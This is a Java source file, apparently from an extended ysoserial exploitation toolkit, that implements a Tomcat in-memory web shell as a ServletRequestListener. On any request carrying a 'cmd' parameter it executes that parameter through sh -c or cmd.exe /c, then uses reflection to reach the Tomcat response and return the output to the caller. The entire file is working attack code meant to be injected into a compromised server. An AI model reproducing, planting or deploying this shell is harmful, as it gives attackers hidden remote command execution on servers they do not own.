package ysoserial.payloads.util.memshell;

import org.apache.catalina.connector.Request;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class MemListener implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    public void requestInitialized(ServletRequestEvent sre) {

        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null) {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String out = s.hasNext() ? s.next() : "";
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request) requestF.get(req);
                HttpServletResponse response = request.getResponse().getResponse();
                response.getWriter().write(out);
                response.getWriter().flush();
            } catch (Throwable throwable) {
                throwable.printStackTrace();
            }
        }
    }
}
